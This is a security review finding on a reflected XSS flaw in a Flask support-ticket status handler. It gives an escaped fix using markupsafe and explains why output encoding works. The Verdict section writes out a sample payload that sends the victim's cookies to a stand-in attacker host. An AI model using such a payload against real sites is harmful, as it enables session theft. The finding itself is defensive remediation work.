## Verdict

Confirmed. `ticket_status()` concatenates two request-controlled query parameters, `ticket` and `priority`, directly into an HTML string that is returned as the response body with no encoding. A request such as `/ticket/status?ticket=<script>document.location='https://evil.example/steal?c='+document.cookie</script>&priority=normal` has its markup reflected verbatim into the page and executed in the victim's browser (reflected XSS).

## Source

- File: `ManualHtmlConstructionPython.py`
- Tainted inputs: `ticket_id = request.args.get("ticket", "")` (line 12) and `priority = request.args.get("priority", "normal")` (line 13)
- Sink: string concatenation into `page` at lines 22-23, returned unescaped at line 28 (`return page`), which Flask serves as `Content-Type: text/html` by default.

## Fix

```python
from flask import Flask, request
from markupsafe import escape

app = Flask(__name__)


def lookup_ticket_status(ticket_id):
    return "Open"


@app.route("/ticket/status")
def ticket_status():
    ticket_id = request.args.get("ticket", "")
    priority = request.args.get("priority", "normal")

    if not ticket_id:
        return "<p>Please provide a ticket number.</p>", 400

    status = lookup_ticket_status(ticket_id)

    page = "<html><body>"
    page += "<h2>Support Ticket Lookup</h2>"
    page += "<p>Ticket: " + escape(ticket_id) + "</p>"
    page += "<p>Priority: " + escape(priority) + "</p>"
    page += "<p>Status: " + escape(status) + "</p>"
    page += "</body></html>"

    return page
```

The minimal change is to wrap every value interpolated into the HTML string with `markupsafe.escape()` (the same escaping function Flask's Jinja2 integration uses internally, bundled as a direct dependency of Flask). `escape()` converts `<`, `>`, `&`, `"`, and `'` into their HTML entity equivalents and returns a `Markup` object, so `<script>` in `ticket_id` is rendered as literal text (`&lt;script&gt;...`) rather than parsed as a tag. `status` is escaped too even though the current `lookup_ticket_status()` stub returns a fixed string, because it is treated as untrusted output data flowing into HTML and a future implementation could source it from a database or ticket-management API.

A more robust structural fix, worth adopting if this handler grows further, is to replace manual string concatenation with `render_template_string()` (or a `.html` template file) and pass `ticket_id`, `priority`, and `status` as template variables — Flask's Jinja2 environment autoescapes by default, which removes the need to remember to escape each interpolation by hand and closes the same class of bug for every future field added to the page.

## Explanation

The handler builds the response by string concatenation, mixing static markup with two attacker-controlled request parameters and no output encoding. HTML is a structural format: any character in `ticket_id` or `priority` that HTML treats as syntax (`<`, `>`, `"`, `&`) is interpreted as markup by the browser rather than as literal ticket data, so a query string is enough to inject arbitrary tags — including `<script>` — into the page the server returns. Because the payload comes from the URL and is reflected back in the same response with no persistence, this is a reflected XSS: the attacker crafts a link (or auto-submitting form) containing the payload and gets a victim to click it while authenticated, letting injected script run in the victim's session to read cookies, perform actions as the victim, or redirect the page.

Escaping at the point of output — rather than trying to filter or reject input — is the correct defense because it preserves the character's data meaning while removing its markup meaning, and it makes the property (this app never emits markup it did not intend to) hold regardless of what a caller supplies or forgets to validate upstream. The fix does not attempt to blocklist `<script>` or other patterns, since any denylist can be bypassed by alternate encodings, event-handler attributes (`onerror=`, `onload=`), or tags other than `script`; contextually correct escaping via `markupsafe.escape()` closes the entire class rather than one payload shape.
